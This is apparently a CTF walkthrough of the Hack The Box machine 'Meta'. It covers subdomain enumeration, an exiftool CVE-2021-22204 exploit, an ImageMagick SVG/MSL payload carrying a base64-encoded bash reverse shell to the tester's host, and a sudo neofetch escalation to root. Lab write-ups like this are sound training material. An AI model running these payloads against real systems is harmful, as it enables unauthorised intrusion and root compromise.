## Meta

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a artcorp.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/af9596ba-2fe2-4d93-a5e0-4c03bb0021b9)

<br>

The website redirect us to artcorp.htb and seems to be static. We need to enumerate subdomains to find interesting things.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://artcorp.htb' -H "Host: FUZZ.artcorp.htb" --hw 0
```

![subdomainEnumeration](https://github.com/b1d0ws/OSCP/assets/58514930/16fa3fb3-f049-402b-8a6f-fd66d1162986)

![website](https://github.com/b1d0ws/OSCP/assets/58514930/30d6f161-1c74-427f-bd2c-9247fc1114f7)

<br>

The subdomain has a feature that read metadata from images.  

![testPNG](https://github.com/b1d0ws/OSCP/assets/58514930/437c2d3c-4ce3-4e78-a5ca-56a40004bcdf)

<br>

Seems to be exiftool and we can prove that trying to upload some malicious metadata in images.

```
exiftool -Notes='<?php echo system('whoami'); ?>' test.png
```

![exiftoolTest](https://github.com/b1d0ws/OSCP/assets/58514930/31e6b90f-01df-48ab-8a22-cc46cf927d8f)

![exiftoolAttempt](https://github.com/b1d0ws/OSCP/assets/58514930/1fccc21c-c7fb-4e94-be38-e5531fa04a41)

![sourceCodeTest](https://github.com/b1d0ws/OSCP/assets/58514930/0417efd6-49e7-4110-8b5e-f539e94fa9f1)

<br>

Searching for exiftool vulnerabilities, we find [this exploit](https://github.com/UNICORDev/exploit-CVE-2021-22204).

```
python3 exploit-CVE-2021-22204.py -s 10.10.14.11 1337
```

![generatingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/c9b00e7c-bedd-45ac-966c-0a69ce9c03be)

<br>

#### User Access

Using pspy to enumerate running process, we discover that /usr/local/bin/convert_images.sh is being running periodically.  

Reading this binary, we see it is using mogrify (a binary that belongs to Image Trick) to deal with files inside /var/www/dev01.artcorp.htb/convert_images/.

![pspy](https://github.com/b1d0ws/OSCP/assets/58514930/8b626a8d-98da-4c7d-a608-d5a84a43bf60)

![convertImages](https://github.com/b1d0ws/OSCP/assets/58514930/2aec8e68-1b73-4b64-be4b-18536dba2c71)

<br>

Searching exploits, [this article](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) shows how to exploit this case.

Create a rce.svg file with the payload above and put it on "convert_images" directory. The payload is a basic reverse shell in base64.

```
<image authenticate='ff" `echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNC4xMS85OTk5IDA+JjEnCg==|base64 -d|bash`;"'>
<read filename="pdf:/etc/passwd"/>
<get width="base-width" height="base-height" />
<resize geometry="400x400" />
<write filename="test.png" />
<svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="msl:rce.svg" height="100" width="100"/>
</svg>
</image>
```

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/4bd023e3-b0d0-4c89-9aeb-24fbb09bd541)

![gettingUser](https://github.com/b1d0ws/OSCP/assets/58514930/206f4ba8-9b92-4fd6-b0bb-c40c0bdc29d1)

<br>

### Root Flag

sudo -l reveals that we can use neofetch as sudo and control XDG_CONFIG_HOME variable.  

To exploit this, we need to export XDG_CONFIG_HOME to our user config directory path and put a bash execution in it.

```
export XDG_CONFIG_HOME=/home/thomas/.config/

cat .config/neofetch/config.conf 
/bin/bash -p

sudo /usr/bin/neofetch \"\"
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/fab81cda-481c-4d18-9bba-0ae6a4d3221c)
